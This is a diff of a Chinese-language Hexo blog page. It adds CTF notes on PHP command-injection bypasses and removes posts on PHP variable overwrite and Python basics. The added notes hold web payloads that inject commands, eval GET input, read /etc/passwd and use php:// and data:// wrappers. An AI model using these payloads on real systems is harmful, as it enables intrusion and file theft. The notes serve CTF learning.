+</tr>
+</thead>
+<tbody><tr>
+<td>command1 &amp; command2（windows）command1；  command2（linux）</td>
+<td>先后执行command1和command2，无论command1是否执行成功</td>
+</tr>
+<tr>
+<td>command1 &amp;&amp; command2</td>
+<td>先后执行command1和command2，只有command1执行成功时才执行command2</td>
+</tr>
+<tr>
+<td>command1||command2</td>
+<td>先后执行command1和command2，只有command1执行失败时才执行command2</td>
+</tr>
+<tr>
+<td>command1|command2</td>
+<td>|是管道符，将command1执行的结果传递给command2</td>
+</tr>
+</tbody></table>
+<hr>
+<hr>
+<hr>
+<p>PHP最后一条语句可以没有分号。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c = system(&quot;cp flag.php 1.txt&quot;);</span><br></pre></td></tr></table></figure>
+<p>反引号`和system函数作用相同</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c = `cp flag.php 1.txt`</span><br></pre></td></tr></table></figure>
+<p>嵌套执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c = eval($_GET[1]);&amp;1=system(&quot;cat flag.php&quot;);</span><br></pre></td></tr></table></figure>
+<p>tac倒序输出文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c = include%0a$_GET[1];&amp;1=/etc/passwd</span><br><span class="line"></span><br><span class="line">1=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=require%0a$_GET[1]?&gt;&amp;1=/etc/passwd</span><br></pre></td></tr></table></figure>
+<p>语言结构（不需要使用括号）<br>echo print isset unset include require  </p>
+<p>data伪协议</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=data://text/plain;&lt;?php phpinfo()?&gt;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>短标签</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=php system(&#x27;cp flag.php 1.txt&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>phpinfo()的返回值是1</p>
+</blockquote>
+<blockquote>
+<p>print_r(get_defined_vars());<br>输出当前所有变量<br>array_pop(next(get_defined_vars()));<br>弹出数组的值<br>eval()即可执行</p>
+</blockquote>
+<blockquote>
+<p>/&gt;dev/null 2&gt;&amp;1<br>无回显，可用双写绕过<br><code>?c=ls;ls</code><br>第一个命令正常输出<br><code>&amp;&amp;</code></p>
+</blockquote>
+<blockquote>
+<p>%20 %09 {$IFS}代替空格</p>
+</blockquote>
+<blockquote>
+<p><code>?c=nl&lt;flag.php&gt;</code></p>
+</blockquote>
+<p>上传文件表单，抓包，将内容改为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#bin/sh</span><br><span class="line"></span><br><span class="line">cat flag.php</span><br></pre></td></tr></table></figure>
+<p>并将c参数改为<code>.%20/???/????????[@-[]</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(())--&gt;0  </span><br><span class="line">~$(())--&gt;-0  </span><br><span class="line">$((~$(())))--&gt;-1</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>构造数字</p>
+</blockquote>
+<p>文件读取  </p>
+<ul>
+<li>file_get_contents</li>
+<li>highlight_file</li>
+<li>show_source</li>
+</ul>
+<p>包含文件后<br><code>var_dump(get_defined_vars())</code>或<code>echo $flag</code></p>
+<p>查看目录<br><code>print_r(scandir(&#39;.&#39;));</code></p>
+<p>curl</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url = &quot;file://var/www/html/flag.php&quot;;</span><br><span class="line"> </span><br><span class="line">$ch = curl_init();</span><br><span class="line"> </span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);</span><br><span class="line">$output = curl_exec($ch);</span><br><span class="line"> </span><br><span class="line">curl_close($ch);</span><br><span class="line"> </span><br><span class="line">echo $output;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://qyzy.github.io/2022/12/09/%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81%E9%82%A3%E4%BA%9B%E4%BA%8B/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -693,666 +1546,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://qyzy.github.io/2022/11/12/PHP%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="竹云">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Welcome To QYZY's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/11/12/PHP%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/" class="post-title-link" itemprop="url">PHP变量覆盖</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-11-12 20:35:50 / 修改时间：20:35:57" itemprop="dateCreated datePublished" datetime="2022-11-12T20:35:50+08:00">2022-11-12</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>变量覆盖是指可以用自己的传参代替原有的变量值</p>
-<h1 id="漏洞寻找"><a href="#漏洞寻找" class="headerlink" title="漏洞寻找"></a>漏洞寻找</h1><p>例如下面的函数或语法使用不当时就会出现漏洞</p>
-<ul>
-<li>$$</li>
-<li>extract()</li>
-<li>parse_str()</li>
-<li>import_request_variables()</li>
-<li>mb_parse_str</li>
-<li>register_globals</li>
-</ul>
-<h1 id="漏洞解析"><a href="#漏洞解析" class="headerlink" title="漏洞解析"></a>漏洞解析</h1><h2 id="extract"><a href="#extract" class="headerlink" title="extract()"></a><strong>extract()</strong></h2><p>原理</p>
-<blockquote>
-<p>extract()函数从数组中将变量导入到当前的符号表。</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;nsilab&#x27;</span>;</span><br><span class="line"><span class="variable">$my_array</span> = (<span class="string">&quot;a&quot;</span>=&gt;<span class="string">&quot;C&quot;</span>,<span class="string">&quot;b&quot;</span>=&gt;<span class="string">&quot;T&quot;</span>,<span class="string">&quot;c&quot;</span>=&gt;<span class="string">&quot;F&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">extarct</span>(<span class="variable">$my_array</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\$a = <span class="subst">$a</span>; \$b = <span class="subst">$b</span>; \$c = <span class="subst">$c</span>;&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"><span class="variable">$a</span> = C; <span class="variable">$b</span> = T; <span class="variable">$c</span> = F</span><br></pre></td></tr></table></figure>
-
-<p>攻击手段  </p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;echo &#x27;nsilab&#x27;;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;nsilab&#x27;</span>;</span><br><span class="line">nsilab</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;echo &#x27;nsilab&#x27;;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://s3.bmp.ovh/imgs/2022/11/12/2c18d66e7a3a912f.png"></p>
-<h2 id=""><a href="#" class="headerlink" title="$$"></a><strong>$$</strong></h2><p>原理</p>
-<blockquote>
-<p>$$产生的漏洞主要是因为foreach遍历数组的值，然后将获取的数组键名作为变量，数组中的值作为变量的值</p>
-</blockquote>
-<ul>
-<li>foreach循环只适用于数组，并用于遍历数组中的每个键/值对。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$colors</span> = <span class="keyword">array</span>(<span class="string">&quot;red&quot;</span>,<span class="string">&quot;green&quot;</span>,<span class="string">&quot;blue&quot;</span>,<span class="string">&quot;yellow&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$colors</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$value</span> \n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">red</span><br><span class="line">green</span><br><span class="line">blue</span><br><span class="line">yellow</span><br></pre></td></tr></table></figure></li>
-<li>$$<blockquote>
-<p>在php中，$var表示一个名为var的普通变量，它存储字符串、整数、浮点等任何值。而$$var是一个引用变量，用于存储$var的值</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$var</span> = <span class="string">&quot;sfc9982&quot;</span>;</span><br><span class="line"><span class="variable">$$var</span> = <span class="string">&quot;UPON&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$var</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$$var</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sfc9982</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">输出：sfc9982</span><br><span class="line">UPON</span><br><span class="line">UPON</span><br></pre></td></tr></table></figure>
-<h2 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str()"></a>parse_str()</h2><blockquote>
-<p>parse_str()把查询字符串解析到变量中</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="keyword">string</span>,<span class="keyword">array</span>)</span><br><span class="line"><span class="keyword">string</span>  必需。规定要解析的字符串。</span><br><span class="line"><span class="keyword">array</span> 可选。规定存储变量的数组的名称。该参数指示变量将被存储到数组中。</span><br></pre></td></tr></table></figure>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="string">&quot;name=eeknight&amp;age=20&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$age</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">eeknight</span><br><span class="line"><span class="number">20</span></span><br></pre></td></tr></table></figure>
-攻击方式<br>如果parse_str()括号是GET，POST等，我们就可以直接执行函数。</li>
-</ul>
-<h2 id="md-parse-str"><a href="#md-parse-str" class="headerlink" title="md_parse_str"></a>md_parse_str</h2><blockquote>
-<p>md_parse_str–&gt;解析GET/POST/COOKIE数据并设置全局变量。具体用法和parse_str()一样</p>
-</blockquote>
-<h2 id="import-request-variables"><a href="#import-request-variables" class="headerlink" title="import_request_variables()"></a>import_request_variables()</h2><blockquote>
-<p>import_request_variables()函数将GET/POST/COOKIE变量导入到全局作用域中。</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 导入POST提交的变量值，前缀为post_</span></span><br><span class="line"><span class="title function_ invoke__">import_request_variable</span>(<span class="string">&quot;p&quot;</span>,<span class="string">&quot;post_&quot;</span>);</span><br><span class="line"><span class="comment">//导入GET和POST提交的变量值，前缀为gp_,GET优先于POST</span></span><br><span class="line"><span class="title function_ invoke__">import_request_variable</span>(<span class="string">&quot;gp&quot;</span>,<span class="string">&quot;_gp&quot;</span>);</span><br><span class="line"><span class="comment">//导入Cookie和GET的变量值，Cookie变量值优先于GET</span></span><br><span class="line"><span class="title function_ invoke__">import_request_variable</span>(<span class="string">&quot;cg&quot;</span>,<span class="string">&quot;_cg&quot;</span>);</span><br></pre></td></tr></table></figure>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">import_request_variables</span>(<span class="string">&quot;gP&quot;</span>, <span class="string">&quot;ee_&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ee_knight</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>攻击方式<br>只要利用了这个函数，就可以直接对里面的变量进行赋值。</p>
-<h2 id="register-globals"><a href="#register-globals" class="headerlink" title="register_globals"></a>register_globals</h2><blockquote>
-<p>register_globals的意思就是注册为全局变量<br>当php.ini中register_globals=On时，传递过来的值会被直接注册文全局变量，当为off时，需要到特定的数组中去得到</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;Register_globals:&quot;</span>.(<span class="keyword">int</span>)<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;register_globals&quot;</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$auth</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="一些附加说明"><a href="#一些附加说明" class="headerlink" title="一些附加说明"></a>一些附加说明</h1><ol>
-<li>parse_str()<br>php.ini文件中的magic_quotes_gpc设置影响该函数的输出。如果已启用，那么在parse_str()解析之前，变量会被addslashes()转换。</li>
-<li>import_request_variables()该函数支持的版本： PHP 4 &gt;= 4.1.0, PHP 5 &lt; 5.4.0。</li>
-<li>register_globals从php5.3.0 起废弃，并从php5.4.0时移除。</li>
-</ol>
-<h1 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h1><ol>
-<li>addslashes()在每个双引号前添加反斜杠。</li>
-<li>使用原始变量，不进行变量注册；</li>
-<li>如果一定要进行变量注册，可以在注册变量前判断变量是否存在。</li>
-</ol>
-<p>转载于<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000039720673">细说变量覆盖那些事</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://qyzy.github.io/2022/11/12/%E6%95%A3%E8%A3%85Python%E9%80%9F%E6%88%90/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="竹云">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Welcome To QYZY's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/11/12/%E6%95%A3%E8%A3%85Python%E9%80%9F%E6%88%90/" class="post-title-link" itemprop="url">散装Python速成</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-11-12 16:51:05" itemprop="dateCreated datePublished" datetime="2022-11-12T16:51:05+08:00">2022-11-12</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-12-03 21:37:17" itemprop="dateModified" datetime="2022-12-03T21:37:17+08:00">2022-12-03</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p><em><strong>本文(侧重于类、文件和异常)配合《Python编程：从入门到实践》食用效果更佳QAQ</strong></em></p>
-<h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><h2 id="字符串大小写："><a href="#字符串大小写：" class="headerlink" title="字符串大小写："></a>字符串大小写：</h2><ul>
-<li>title() </li>
-<li>upper()</li>
-<li>lower() </li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">&quot;ada lovelace&quot;</span></span><br><span class="line"><span class="built_in">print</span>(name.title())</span><br></pre></td></tr></table></figure>
-<p>合并字符串</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">first_name = <span class="string">&quot;ada&quot;</span></span><br><span class="line">last_name = <span class="string">&quot;lovelace&quot;</span></span><br><span class="line">full_name = first_name + <span class="string">&quot; &quot;</span> + last_name</span><br><span class="line"><span class="built_in">print</span>(full_name)</span><br></pre></td></tr></table></figure>
-
-<h2 id="删除空白："><a href="#删除空白：" class="headerlink" title="删除空白："></a>删除空白：</h2><ul>
-<li>rstrip()</li>
-<li>lstrip()</li>
-<li>strip()</li>
-</ul>
-<h2 id="str"><a href="#str" class="headerlink" title="str()"></a>str()</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">age = <span class="number">23</span></span><br><span class="line">message = <span class="string">&quot;Happy &quot;</span> + <span class="built_in">str</span>(age) +<span class="string">&quot;rd Birthday!&quot;</span></span><br><span class="line"><span class="built_in">print</span>(message)</span><br></pre></td></tr></table></figure>
-
-
-
-
-<h1 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bicycles = [<span class="string">&#x27;trek&#x27;</span>,<span class="string">&#x27;cannondale&#x27;</span>,<span class="string">&#x27;redline&#x27;</span>,<span class="string">&#x27;specialized&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(bicycles[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>
-<p><strong>列表的索引从0开始</strong><br>将索引指定为-1可返回最后一个元素</p>
-<h2 id="添加元素："><a href="#添加元素：" class="headerlink" title="添加元素："></a>添加元素：</h2><ul>
-<li>append(元素)</li>
-<li>insert(索引，元素)<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">motorcycles = [<span class="string">&#x27;honda&#x27;</span>,<span class="string">&#x27;yamaha&#x27;</span>,<span class="string">&#x27;suzuki&#x27;</span>]</span><br><span class="line">motorcycles.append(<span class="string">&#x27;ducati&#x27;</span>)</span><br><span class="line">motorcycles.insert(<span class="number">0</span>,<span class="string">&#x27;liudazhuang&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="删除元素："><a href="#删除元素：" class="headerlink" title="删除元素："></a>删除元素：</h2><ul>
-<li>del 列表名[索引]</li>
-<li>pop(索引) </li>
-<li>remove(值)<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">motorcycles = [<span class="string">&#x27;honda&#x27;</span>,<span class="string">&#x27;yamaha&#x27;</span>,<span class="string">&#x27;suzuki&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> motorcycles[<span class="number">0</span>]</span><br><span class="line">popped_motorcycle = motorcycles.pop(<span class="number">2</span>)</span><br><span class="line">motorcycles.remove(<span class="string">&#x27;yamaha&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="列表排序；"><a href="#列表排序；" class="headerlink" title="列表排序；"></a>列表排序；</h2><ul>
-<li>sort()<br><code>reverse=True(逆序)、永久排序</code></li>
-<li>sorted(列表名)<br><code>临时排序</code></li>
-<li>reverse()<br><code>反转顺序</code><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cars = [<span class="string">&#x27;bmw&#x27;</span>,<span class="string">&#x27;audi&#x27;</span>,<span class="string">&#x27;toyota&#x27;</span>,<span class="string">&#x27;subaru&#x27;</span>]</span><br><span class="line">cars.sort()</span><br><span class="line">cars.sort(reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sorted</span>(cars))</span><br><span class="line">cars.reverse()-</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="列表长度："><a href="#列表长度：" class="headerlink" title="列表长度："></a>列表长度：</h2><ul>
-<li>len()</li>
-</ul>
-<h2 id="遍历列表："><a href="#遍历列表：" class="headerlink" title="遍历列表："></a>遍历列表：</h2><p>for循环：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">magicians=[<span class="string">&#x27;alice&#x27;</span>,<span class="string">&#x27;david&#x27;</span>,<span class="string">&#x27;carolina&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> magician <span class="keyword">in</span> magicians:</span><br><span class="line">    <span class="built_in">print</span>(magincian)</span><br></pre></td></tr></table></figure>
-
-<p>数字列表：<br>range()函数:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">    <span class="built_in">print</span>(value)</span><br></pre></td></tr></table></figure>
-
-<p><strong>只会输出1~4！！！(左闭右开)</strong>  </p>
-<p>使用range()创建数字列表：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">numbers=<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>))</span><br><span class="line"><span class="built_in">print</span>(numbers)</span><br></pre></td></tr></table></figure>
-<p><strong>range的第三个参数表示步长</strong></p>
-<p>数字列表简单统计</p>
-<ul>
-<li>max()</li>
-<li>min()</li>
-<li>sum()</li>
-</ul>
-<p>列表解析：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">squares = [value**<span class="number">2</span> <span class="keyword">for</span> value <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>)]</span><br><span class="line"><span class="built_in">print</span>(squares)  </span><br></pre></td></tr></table></figure>
-<p>切片(列表的一部分)：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">players = [<span class="string">&#x27;charles&#x27;</span>,<span class="string">&#x27;martina&#x27;</span>,<span class="string">&#x27;michael&#x27;</span>,<span class="string">&#x27;florence&#x27;</span>,<span class="string">&#x27;eli&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(players[<span class="number">0</span>:<span class="number">3</span>])</span><br></pre></td></tr></table></figure>
-<p>输出索引为0、1、2的前三个元素<br>如果没有指定第一个索引，自动从列表开头开始<br>没有终止索引到列表末尾</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">players[-<span class="number">3</span>:]</span><br></pre></td></tr></table></figure>
-<p>输出最后三个元素</p>
-<p>复制列表：<br>同时省略起始索引和终止索引<code>[:]</code><br><strong><code>列表1=列表2</code>这种写法实际上指向同一个列表</strong></p>
-<p>元组(不可变的列表)：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dimensions=(<span class="number">200</span>,<span class="number">50</span>)</span><br><span class="line"><span class="built_in">print</span>(dimensions[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(dimensions[<span class="number">1</span>])</span><br></pre></td></tr></table></figure>
-
-<h1 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h1><ul>
-<li>and</li>
-<li>or</li>
-<li>in <code>检查特定值是否包含在列表中</code></li>
-<li>not in</li>
-<li>True/False<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> conditional_test:</span><br><span class="line">    do something</span><br></pre></td></tr></table></figure></li>
-</ul>
